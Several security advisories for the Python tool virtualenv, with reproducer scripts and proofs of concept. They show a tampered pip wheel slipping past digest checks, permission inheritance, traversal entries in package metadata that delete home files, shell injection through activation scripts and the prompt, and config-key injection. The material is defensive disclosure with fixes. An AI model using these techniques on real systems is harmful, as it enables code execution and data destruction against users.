vulnerabilities.details: ## Summary The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected. Index candidates on that path do not pass through virtualenv's wheel digest verification. Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Wheel selection by the pip seeder when downloads are enabled. ## Attacker-controlled input The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy. Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset with open(f"{work}/pip.conf", "w") as pip_conf: pip_conf.write(f"[global]\nindex-url = file://{work}/mirror\n") # file:// stands in for the mirror's http URL os.makedirs(f"{work}/home-default") os.makedirs(f"{work}/home-pip") # one HOME per run, so neither sees the other's app-data or pip cache virtualenv = [sys.executable, f"{companions}/virtualenv_offline.py", f"{work}/pypi.org", "--no-periodic-update"] # control: the default seeder with --download fetches the mirror's wheel and refuses it default_seeder = subprocess.run( [*virtualenv, "--download", f"{work}/env-default"], env={**os.environ, "HOME": f"{work}/home-default", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith("RuntimeError: ")] print(f"\nCONTROL virtualenv --download env-default: exit {default_seeder.returncode}") print("\n".join(refusal)) # trigger: the same command plus --seeder pip pip_seeder = subprocess.run( [*virtualenv, "--download", "--seeder", "pip", f"{work}/env-pip"], env={**os.environ, "HOME": f"{work}/home-pip", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) print(f"\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}") print(pip_seeder.stdout) if pip_seeder.returncode == 0: env_pip = subprocess.run([f"{work}/env-pip/bin/pip", "--version"], capture_output=True, text=True, check=True) print(f"$ env-pip/bin/pip --version\n{env_pip.stdout}") # check: compare env-pip's pip/__init__.py with the one in each wheel with zipfile.ZipFile(bundled.path) as wheel: bundled_init = wheel.read("pip/__init__.py") with zipfile.ZipFile(mirror_wheel) as wheel: mirror_init = wheel.read("pip/__init__.py") installed = glob.glob(f"{work}/env-pip/lib/python*/site-packages/pip/__init__.py") installed_init = open(installed[0], "rb").read() if installed else b"" refusal_message = f"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}" refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout print(f"default seeder refused the mirror's wheel for its digest: {refused}") print(f"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}") print(f"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}") print("BUG" if refused and installed_init == mirror_init and os.path.exists(marker) else "OK") ``` **`repro.d/make_mirror.py`** ```text #!/usr/bin/env python3 # usage: make_mirror.py import os import sys import zipfile genuine_wheel, mirror, marker = sys.argv[1:] wheel_name = os.path.basename(genuine_wheel) payload = f"\nopen({marker!r}, 'w').write('mirror code ran')\n" os.makedirs(f"{mirror}/pip") with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f"{mirror}/pip/{wheel_name}", "w") as served: for entry in genuine.infolist(): data = genuine.read(entry) if entry.filename == "pip/__init__.py": data += payload.encode() served.writestr(entry, data) # PEP 503 project page; pip reads /pip/index.html for a file:// index with open(f"{mirror}/pip/index.html", "w") as page: page.write(f'{wheel_name}\n') ``` **`repro.d/virtualenv_offline.py`** ```text #!/usr/bin/env python3 # usage: virtualenv_offline.py # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched. import sys from virtualenv.__main__ import run_with_catch from virtualenv.seed.wheels import periodic_update pypi_org = sys.argv[1] def pypi_json_api(url, context=None): return open(url.replace("https://pypi.org", pypi_org), "rb") periodic_update.urlopen = pypi_json_api run_with_catch(sys.argv[2:]) ``` ## Impact The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by itself defeat TLS or establish control of an index response. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix acquires wheels through the shared verification path and installs pinned names with index lookup disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze output. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives separately. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.

## Summary

The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache
populated under permissive permissions can therefore produce files with wider access in later environments.

Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permissions of files copied from app-data into a new environment.

## Attacker-controlled input

The cache must contain files created with broader permissions than the current environment creator intends. Another
account must also be able to traverse the new environment and reach those files. A private parent directory prevents
that access. No control of a private live cache is assumed.

## Affected code

The relevant 21.14.8 source is in
[copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with
`shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the
current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can
receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.

## Reproduction and evidence

The scanner created two histories with separate private app-data caches. In the control, the owner's first run used
umask `022`; a later environment had no files writable by another account, and that account could not append to
`pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report
counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and
`bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both
histories.

An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable
destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates
app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425)
creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.

## Attack sequence

```mermaid
sequenceDiagram
    participant U as Environment owner
    participant C as Private app-data cache
    participant E as Later environment
    participant A as Other local account
    U->>C: first seed extraction under umask 000
    C-->>U: cached pip files have mode 0666
    U->>E: create environment under umask 022
    C->>E: shutil.copy reapplies mode 0666
    A->>E: append code to pip/__init__.py
    U->>E: run bin/pip --version
    E-->>U: appended code runs as owner
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import glob
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

sys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processes
os.umask(0o022)  # for the directories made here as root
OWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uids
VIRTUALENV = ["virtualenv", "--quiet", "--no-periodic-update"]  # default seeder; no network for the update check
# read here, as root: /tmp/repro.d need not be readable by the other user
ATTACK = Path("/tmp/repro.d/other_user_appends_to_pip.py").read_text()


def run_as_owner(command, home, umask):
    environ = {"HOME": str(home), "PATH": os.environ["PATH"]}
    subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)


def mode(path):
    return stat.filemode(os.stat(path).st_mode)


work = Path("/tmp/seed-mode-repro")
shutil.rmtree(work, ignore_errors=True)
work.mkdir()
proofs = work / "proofs"
proofs.mkdir()
proofs.chmod(0o777)  # the other user's line writes the uid it runs as in here

writable_by_others, appended_line_ran_as = {}, {}
# the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenv
for case, umask_of_earlier_run in [("CONTROL", 0o022), ("OBSERVED", 0o000)]:
    # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path
    home = work / f"{case}-home"
    home.mkdir(mode=0o700)
    os.chown(home, OWNER, OWNER)
    projects = work / f"{case}-projects"
    projects.mkdir(mode=0o755)
    os.chown(projects, OWNER, OWNER)

    # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it
    run_as_owner([*VIRTUALENV, str(home / "earlier-env")], home, umask=umask_of_earlier_run)
    # owner, today
    env = projects / "env"
    run_as_owner([*VIRTUALENV, str(env)], home, umask=0o022)

    (cached_pip,) = glob.glob(f"{home}/.cache/virtualenv/wheel/*/image/1/CopyPipInstall/pip-*/pip/__init__.py")
    (seeded_pip,) = glob.glob(f"{env}/lib/python*/site-packages/pip/__init__.py")
    env_files = [path for path in env.rglob("*") if path.is_file() and not path.is_symlink()]
    writable_by_others[case] = sum(1 for path in env_files if path.stat().st_mode & stat.S_IWOTH)
    print(f"{case} earlier run under umask {umask_of_earlier_run:03o}, env created under umask 022")
    print(f"{case}   cache pip/__init__.py  {mode(cached_pip)}")
    print(f"{case}   env   pyvenv.cfg       {mode(env / 'pyvenv.cfg')}")
    print(f"{case}   env   bin/activate     {mode(env / 'bin' / 'activate')}")
    print(f"{case}   env   pip/__init__.py  {mode(seeded_pip)}")
    print(f"{case}   env files writable by others: {writable_by_others[case]} of {len(env_files)}")

    # attack: another local user appends a line to the owner's seeded pip
    proof = proofs / case
    subprocess.run(
        ["python3", "-", str(env), str(proof)],
        input=ATTACK,
        text=True,
        user=OTHER_USER,
        group=OTHER_USER,
        extra_groups=[],
        env={"PATH": os.environ["PATH"]},
        cwd="/",
        check=True,
    )

    # the owner uses the environment
    run_as_owner([str(env / "bin" / "pip"), "--version"], home, umask=0o022)
    appended_line_ran_as[case] = proof.read_text() if proof.exists() else None
    print(f"{case}   other user's line ran as uid: {appended_line_ran_as[case]}")

# check: the same umask 022 today must give the same modes, whatever umask filled the cache earlier
control_is_private = writable_by_others["CONTROL"] == 0 and appended_line_ran_as["CONTROL"] is None
observed_runs_as_owner = writable_by_others["OBSERVED"] > 0 and appended_line_ran_as["OBSERVED"] == str(OWNER)
print("BUG" if control_is_private and observed_runs_as_owner else "OK")
```

**`repro.d/other_user_appends_to_pip.py`**

```text
import glob
import sys

environment, proof = sys.argv[1:]
(pip_init,) = glob.glob(f"{environment}/lib/python*/site-packages/pip/__init__.py")
added_line = f"\nimport os; open({proof!r}, 'w').write(str(os.getuid()))\n"

try:
    with open(pip_init, "a") as pip_source:
        pip_source.write(added_line)
    print(f"other user: appended a line to {pip_init}")
except PermissionError as error:
    print(f"other user: {error}")
```

## Impact

Copied seed files can remain readable or writable by other accounts despite the current umask. Exposure requires those
accounts to be able to traverse the destination's parent directories. An attacker need not control the private source
cache.

Severity: low.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix creates destination files with mode `0644`, or `0755` for executable sources, filtered further by the
current umask. It does not grant group or world write access, even with a permissive umask. Source modes are not
preserved, including modes more restrictive than this creation policy.

Fix: [PR #3425](https://github.com/pypa/virtualenv/pull/3425).

## Known mitigation

Create environments beneath a directory accessible only to their owner. Recreate environments whose permissions were
inherited from a permissive cache.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-487MH6OW.

## Summary

The app-data seeder joins paths from existing distribution metadata to site-packages and deletes the resulting paths
without checking containment within the environment.

Anthropic's OSS Scanner reported this as `ANT-2026-SXOEHWP7` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Removal of a previously installed seed package.

## Attacker-controlled input

An environment being reused must contain distribution metadata influenced by another account. The invoking user must
have deletion rights over the paths named by that metadata. Installing a new environment without existing package
metadata does not enter this cleanup path.

## Affected code

The relevant 21.14.8 source is in
[seed uninstall](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).

## Mechanism

Before reinstalling a seed wheel, `PipInstall._uninstall_previous_version()` accepts an existing `pip-*.dist-info`
directory in the destination. `_uninstall_dist()` reads its `top_level.txt` and `RECORD`, joins each entry to
`site-packages`, and deletes the result. It does not check whether `..`, an absolute entry, or a linked parent takes the
path outside the environment. The default app-data seeder reaches this path when it reuses a tree containing
seed-package metadata; `--clear` removes that tree first.

## Reproduction and evidence

The scanner prepared a project with `.venv/lib/python3.14/site-packages/pip-1.0.dist-info/`. Its `top_level.txt`
contained `../../../../../Documents`; its `RECORD` named `../../../../../notes.txt,,`. The user's home initially held
`Documents/thesis/chapter1.txt` and `notes.txt`. Running `virtualenv .venv` exited successfully but removed both paths.
A control tree with `top_level.txt` set to `pip` and a normal `pip/__init__.py` RECORD entry left the home files in
place. The reproducer prints `BUG` only when the control files survive and both attack targets disappear.

The deletion uses the invoking user's permissions and runs during creation, before any use of the environment. It
requires an existing destination that another account could populate; a fresh empty environment does not supply hostile
metadata. The report traces this cleanup to #2186, first released in 20.8.1.
[PR #3428](https://github.com/pypa/virtualenv/pull/3428) checks each deletion path against the resolved environment root
and refuses to delete the root itself.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared .venv metadata
    participant V as App-data seeder
    participant P as site-packages
    participant H as User home
    A->>P: top_level.txt names ../../../../../Documents
    A->>P: RECORD names ../../../../../notes.txt
    V->>P: read pip-1.0.dist-info before reinstall
    P->>H: join entries without containment check
    V->>H: remove Documents and notes.txt
    V-->>A: virtualenv exits successfully
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-SXOEHWP7`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

work = Path("/tmp/repro-seed-uninstall")
shutil.rmtree(work, ignore_errors=True)
USER_FILES = ("Documents/thesis/chapter1.txt", "notes.txt")


def make_home(name):
    home = work / name
    (home / "Documents" / "thesis").mkdir(parents=True)
    (home / "Documents" / "thesis" / "chapter1.txt").write_text("months of work\n")
    (home / "notes.txt").write_text("my notes\n")
    return home


def unpack_attacker_project(home, top_level_line, record_line):
    subprocess.run(
        [sys.executable, "/tmp/repro.d/make_project_tree.py", home / "project", top_level_line, record_line],
        check=True,
    )


def user_runs_virtualenv(home):
    # HOME only gives each run its own ~ and app-data; --no-periodic-update keeps the run offline
    result = subprocess.run(
        ["virtualenv", "--no-periodic-update", ".venv"],
        cwd=home / "project",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        text=True,
        check=True,
    )
    print(result.stdout, end="")


def files_left(home):
    return [f for f in USER_FILES if (home / f).exists()]


# control: the project ships well-formed pip metadata
control_home = make_home("control")
unpack_attacker_project(control_home, "pip", "pip/__init__.py,,")
user_runs_virtualenv(control_home)
control_left = files_left(control_home)
print(f"CONTROL  user files still in ~ after virtualenv: {control_left}")

# attack: site-packages is ~/project/.venv/lib/python3.X/site-packages, so five ".." is ~
attack_home = make_home("attack")
unpack_attacker_project(attack_home, "../../../../../Documents", "../../../../../notes.txt,,")
print(f"BEFORE   user files in ~ before virtualenv: {files_left(attack_home)}")
user_runs_virtualenv(attack_home)
attack_left = files_left(attack_home)
print(f"OBSERVED user files still in ~ after virtualenv: {attack_left}")

# check: creating an environment must never delete the user's files outside it
print("BUG" if control_left == list(USER_FILES) and attack_left == [] else "OK")
```

**`repro.d/make_project_tree.py`**

```text
#!/usr/bin/env python3
import sys
from pathlib import Path

project = Path(sys.argv[1])
top_level_line = sys.argv[2]
record_line = sys.argv[3]

project.mkdir(parents=True)
(project / "README").write_text("Set up with: virtualenv .venv\n")

# a leftover .venv claiming pip 1.0 is installed; one copy per lib/python3.X, as the victim's Python is unknown
for minor in range(9, 16):
    dist_info = project / ".venv" / "lib" / f"python3.{minor}" / "site-packages" / "pip-1.0.dist-info"
    dist_info.mkdir(parents=True)
    (dist_info / "top_level.txt").write_text(top_level_line + "\n")
    (dist_info / "RECORD").write_text(record_line + "\n")
```

## Impact

Seed cleanup can delete files outside the environment or the environment root itself. The invoking user must have
deletion rights over those paths.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix skips cleanup paths outside the resolved environment root, and the root itself, with a warning. Final
links are removed without following their targets; parent links participate in containment checks.

Fix: [PR #3428](https://github.com/pypa/virtualenv/pull/3428).

## Known mitigation

Recreate environments from a trusted empty destination rather than reseeding a tree with untrusted installed metadata.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

Reported by Anthropic's OSS Scanner as ANT-2026-SXOEHWP7.

vulnerabilities.details:
### Impact

The generated `activate` (bash/zsh) and `activate.fish` scripts interpolate a `shlex.quote`-ed value into a position that quotes it a second time. The extra quotes terminate the quoted run early and leave part of the value parsed as shell code, so a path containing shell metacharacters runs commands when a user sources the activation script.

`activate` is affected through the virtual environment's own path, on the branch that reports a relocated environment:

```sh
echo "Virtual environment directory __VIRTUAL_ENV__ does not exist!" >&2
```

For a destination named `x'$(id)'y`, `shlex.quote` emits `'x'"'"'$(id)'"'"'y'`. The inner `"` closes the enclosing double quote and `$(id)` is left unquoted. Backtick and `;` payloads reach the same result. This branch runs whenever the recorded path is absent, which is the normal case for a virtual environment copied or distributed to another machine.

`activate.fish` is affected through the interpreter's Tcl/Tk library paths:

```fish
set -gx TCL_LIBRARY '__TCL_LIBRARY__'
```

`shlex.quote` already returns `'/tcl/(cmd)/lib'`, so the rendered line is `''/tcl/(cmd)/lib''`. fish concatenates the adjacent quoted runs and expands the `(cmd)` left between them. The same doubling also splits a path containing a space into two list elements, corrupting `TCL_LIBRARY` and `TK_LIBRARY`.

This is the same defect class as GHSA-x78j-v8h9-3j2q, which covered `activate.bat`.

### Patches

Fixed in 21.7.13 by moving the placeholders outside the surrounding quotes, so each value keeps only the quoting `shlex.quote` applied. Fix: https://github.com/pypa/virtualenv/pull/3252

### Workarounds

Avoid creating or distributing virtual environments whose path contains `'`, `` ` ``, `$`, `;`, `(` or `)`, and inspect the generated activation script before sourcing one you did not create.

vulnerabilities.details:
## Summary

The venv creator reads the standard library's generated pyvenv.cfg with splitlines() and merges all resulting keys over
virtualenv's configuration. Line-boundary characters from destination data can therefore become configuration structure
before output sanitization.

Anthropic's OSS Scanner reported this as `ANT-2026-6ZQHJ6VI` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Configuration readback by the stdlib venv creator.

## Attacker-controlled input

An untrusted caller must influence the destination pathname passed to the venv creator. That pathname must contain a
character that Python treats as a line boundary. The builtin creator follows a different configuration-writing path.

## Affected code

The relevant 21.14.8 source is in
[venv readback](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/venv.py),
[configuration parser](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).

## Mechanism

With `--creator venv`, virtualenv asks the standard library to create an environment, reads its `pyvenv.cfg` with
`str.splitlines()`, and merges the parsed keys over virtualenv's chosen settings. CPython writes the destination into a
`command =` value without escaping every character that `splitlines()` recognizes as a line boundary. A destination
containing U+2028, for example, can therefore supply new `home` and `include-system-site-packages` keys during readback.
Virtualenv writes those keys as real configuration lines. The builtin creator does not use this readback path.

## Reproduction and evidence

The scanner used one destination value with U+2028 between `home = /attacker/chosen`,
`include-system-site-packages = true`, and an absorbing `x =` key. A `python -m venv --without-pip` control kept the
value inside its `command` line and reported the base interpreter's `sys._home`. `virtualenv --creator venv --no-seed`
on the same value wrote separate injected configuration lines and its interpreter reported
`sys._home = /attacker/chosen`. The path did not require a literal newline byte. The control establishes that the extra
keys came from virtualenv's readback, not from the standard library's initial file alone.

The altered `home` can change which standard-library files the interpreter loads if an attacker also controls that
location; `include-system-site-packages = true` weakens environment isolation. Choosing the venv creator is required,
either explicitly or through a rare fallback. The report traces the readback to the 20.x rewrite, first released in
20.0.0b1. [PR #3426](https://github.com/pypa/virtualenv/pull/3426) rejects line-boundary characters before creation and
rebuilds the final configuration from selected settings.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Destination supplier
    participant S as stdlib venv
    participant V as virtualenv readback
    participant C as Final pyvenv.cfg
    participant P as Environment Python
    A->>S: path contains U+2028 and home = /attacker/chosen
    S->>C: write path inside command value
    V->>C: read with splitlines()
    V->>V: parse suffix as separate keys
    V->>C: rewrite home and include-system-site-packages
    P->>C: read injected keys on startup
    C-->>P: sys._home changes and isolation is disabled
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-6ZQHJ6VI`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess

work = "/tmp/repro-venv-creator-cfg"
shutil.rmtree(work, ignore_errors=True)

# the attacker's input: the text of a destination path.
# U+2028 ends a line for str.splitlines() but not for CPython's own pyvenv.cfg reader.
# The slashes only make nested directories; the last key, x, absorbs the rest of the path.
LS = "\u2028"
dest = f"{work}/proj{LS}home = /attacker/chosen{LS}include-system-site-packages = true{LS}x = /env"

base_python = os.path.realpath(shutil.which("python"))
real_home = os.path.dirname(base_python)


def pyvenv_cfg_lines(env):
    # split on "\n" only, as the interpreter does
    return open(f"{env}/pyvenv.cfg", encoding="utf-8").read().split("\n")


def sys_home(env):
    # site.py sets sys._home from the `home` key of the environment's pyvenv.cfg
    probe = [f"{env}/bin/python", "-c", "import sys; print(sys._home)"]
    return subprocess.run(probe, capture_output=True, text=True, check=True).stdout.strip()


# control: the same path through the standard library alone
stdlib_env = dest + "-stdlib"
subprocess.run([base_python, "-m", "venv", "--without-pip", stdlib_env], check=True)

# attack: the same path through virtualenv; --creator venv is the one non-default option
virtualenv_env = dest + "-virtualenv"
created = subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--no-seed", "--creator", "venv", virtualenv_env])
if created.returncode != 0:  # refusing such a destination is a valid fix
    print("virtualenv refused the destination")
    print("OK")
    raise SystemExit

# check
stdlib_cfg, stdlib_home = pyvenv_cfg_lines(stdlib_env), sys_home(stdlib_env)
virtualenv_cfg, virtualenv_home = pyvenv_cfg_lines(virtualenv_env), sys_home(virtualenv_env)

print("CONTROL  python -m venv wrote pyvenv.cfg:")
for line in stdlib_cfg:
    print("    " + ascii(line))
print(f"CONTROL  python -m venv: sys._home = {stdlib_home}")
print("OBSERVED virtualenv --creator venv wrote pyvenv.cfg:")
for line in virtualenv_cfg:
    print("    " + ascii(line))
print(f"OBSERVED virtualenv --creator venv: sys._home = {virtualenv_home}")

keys_injected = "home = /attacker/chosen" in virtualenv_cfg and "include-system-site-packages = true" in virtualenv_cfg
print("BUG" if stdlib_home == real_home and keys_injected and virtualenv_home == "/attacker/chosen" else "OK")
```

## Impact

Destination path data can change configuration boundaries and therefore environment settings. The effect depends on
which settings change and how the environment is subsequently used.

Severity: low.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix rejects line boundaries in the supplied destination before filesystem access and checks the resolved
path again before invoking stdlib venv. The final configuration is rebuilt from the selected interpreter and virtualenv
options, without merging the intermediate stdlib file or its vendor-specific keys. Ordinary destination paths remain
supported.

Fix: [PR #3426](https://github.com/pypa/virtualenv/pull/3426).

## Known mitigation

Reject line-boundary characters in externally supplied destination paths, or use the builtin creator where supported.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-6ZQHJ6VI.

vulnerabilities.details:
### Summary

The bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a
backslash in the name undoes the escaping and a name containing `\$(...)` runs as commands in the user's shell each
time bash draws the prompt.

### Affected area

`src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.

### Attacker-controlled input

The environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker
needs to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through,
or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.

### Details

bash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\`
into `\` and `\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic
expansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only
for the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before
21.13.0 do not escape the name at all. A bash running as root decodes `\$` to `#`, so the payload shows the wrong text
there but runs nothing. zsh does no decode pass and is not affected.

### Proof of concept

```console
$ virtualenv --prompt 'a\$(touch PWNED)' env
$ bash --norc --noprofile -c 'source env/bin/activate; printf "%s" "${PS1@P}"'
$ ls PWNED
PWNED
```

### Impact

Arbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an
attacker influenced, with that user's privileges, once per prompt draw.

### Versions tested

21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.

### Known mitigation

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars`
if your prompt does not need expansion. Check the name of an environment you did not create before you source its
`activate`.

### Latest release

- [x] The problem reproduces on the latest virtualenv release.

21.14.6

### Patches

Fixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the
example above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs.
Fix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932

### Credits

Found while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.

vulnerabilities.details:
`BatchActivator.quote()` returned its input unchanged, the only activator with no escaping at all. `--prompt`, the `VIRTUALENV_PROMPT` environment variable, and the config file all set the prompt, and `activate.bat` writes it straight into `@set "VAR=value"`. A prompt containing a double quote closes that string early, and whatever follows runs as live cmd.exe syntax:

```console
